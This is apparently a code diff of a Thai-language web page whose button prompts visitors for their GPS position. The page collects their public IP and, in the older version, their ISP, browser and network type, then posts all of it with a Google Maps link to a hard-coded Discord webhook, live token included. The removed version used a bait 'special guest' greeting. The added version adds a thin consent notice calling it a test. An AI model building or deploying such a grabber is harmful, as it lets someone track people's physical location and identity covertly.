@@ -2,92 +2,58 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>✅ ยินดีต้อนรับสู่เว็บไซต์</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🔒 ระบบทดสอบตำแหน่ง</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="container">
+  <div class="box">
     <h1>✅ ยินดีต้อนรับสู่เว็บไซต์</h1>
-    <p>คุณเป็นแขกพิเศษของเรา</p>
-    <button id="sendBtn">คลิกที่นี่</button>
+    <p>เว็บไซต์นี้จะเก็บข้อมูลตำแหน่งและ IP ภายในเท่านั้น เพื่อใช้ในการทดสอบ</p>
+    <p>หากคุณไม่ยินยอม กรุณาออกจากหน้านี้ทันที</p>
+
+    <button onclick="collectInfo()">คลิกเพื่อเริ่มทดสอบระบบ</button>
+    <p id="status" style="margin-top: 20px;"></p>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1378728447647682591/BgtTJM5LlpBKWcrHmH7e32FHQq4z-TwIJUiy133A7mHI2SmwmIPbZ6-_8ro1E0tINTYQ"; // แทนที่ด้วย Webhook จริง
+    const webhook = "https://discord.com/api/webhooks/1378728447647682591/BgtTJM5LlpBKWcrHmH7e32FHQq4z-TwIJUiy133A7mHI2SmwmIPbZ6-_8ro1E0tINTYQ"; // ใส่ Webhook จริงของคุณตรงนี้
 
-    document.getElementById("sendBtn").addEventListener("click", () => {
-      if (!navigator.geolocation) {
-        alert("อุปกรณ์ของคุณไม่รองรับการขอตำแหน่ง GPS");
-        return;
-      }
+    function collectInfo() {
+      document.getElementById("status").innerText = "📡 กำลังขอข้อมูลตำแหน่ง...";
 
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+      navigator.geolocation.getCurrentPosition(async position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
-          fetch("https://ipapi.co/json/?lang=th")
-            .then(res => res.json())
-            .then(data => {
-              const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-              const netType = connection ? connection.effectiveType || connection.type || "ไม่ทราบ" : "ไม่ทราบ";
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
 
-              const info = {
-                ip: data.ip,
-                country: data.country_name,
-                city: data.city || "ไม่พบข้อมูล",
-                org: data.org || "ไม่พบข้อมูล",
-                timezone: data.timezone || "ไม่พบข้อมูล",
-                lat,
-                lon,
-                browser: navigator.userAgent,
-                netType,
-                time: new Date().toLocaleString("th-TH", { timeZone: data.timezone || "Asia/Bangkok" }),
-              };
+        const embed = {
+          username: "📍 ระบบทดสอบ GPS",
+          embeds: [{
+            title: "📡 ข้อมูลตำแหน่งที่ได้",
+            color: 0x00cc99,
+            fields: [
+              { name: "🌐 IP", value: ipData.ip, inline: false },
+              { name: "📍 พิกัด", value: `Latitude: ${lat}\nLongitude: ${lon}`, inline: false },
+              { name: "🗺️ แผนที่", value: `[เปิดดูบน Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
+              { name: "🕒 เวลา", value: new Date().toLocaleString(), inline: false }
+            ]
+          }]
+        };
 
-              const embed = {
-                username: "📊 ผู้เข้าชมเว็บ!",
-                embeds: [
-                  {
-                    title: "🚀 คนเข้าชมใหม่",
-                    color: 0x00ccff,
-                    fields: [
-                      { name: "🕒 เวลาเข้า", value: info.time, inline: false },
-                      { name: "🌍 IP", value: info.ip, inline: true },
-                      { name: "📍 ประเทศ/เมือง", value: `${info.country} / ${info.city}`, inline: true },
-                      { name: "🌐 ผู้ให้บริการ", value: info.org, inline: false },
-                      { name: "📡 ประเภทเน็ตเวิร์ก", value: info.netType, inline: true },
-                      { name: "💻 เบราว์เซอร์", value: info.browser, inline: false },
-                      {
-                        name: "📍 แผนที่ Google Maps",
-                        value: `[ดูตำแหน่ง](https://www.google.com/maps?q=${info.lat},${info.lon})`,
-                        inline: false,
-                      },
-                    ],
-                  },
-                ],
-              };
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(embed)
+        });
 
-              fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(embed),
-              })
-                .then(res => {
-                  if (res.ok) alert("ส่งข้อมูลเรียบร้อย!");
-                  else alert("เกิดข้อผิดพลาดในการส่งข้อมูล");
-                })
-                .catch(err => alert("เกิดข้อผิดพลาด: " + err.message));
-            })
-            .catch(() => alert("ไม่สามารถดึงข้อมูล IP ได้"));
-        },
-        err => {
-          alert("ไม่สามารถขอตำแหน่ง GPS ได้: " + err.message);
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    });
+        document.getElementById("status").innerText = "✅ ข้อมูลถูกส่งเรียบร้อยแล้ว!";
+      }, err => {
+        document.getElementById("status").innerText = "❌ ไม่สามารถดึงตำแหน่งได้: " + err.message;
+      });
+    }
   </script>
 </body>
 </html>
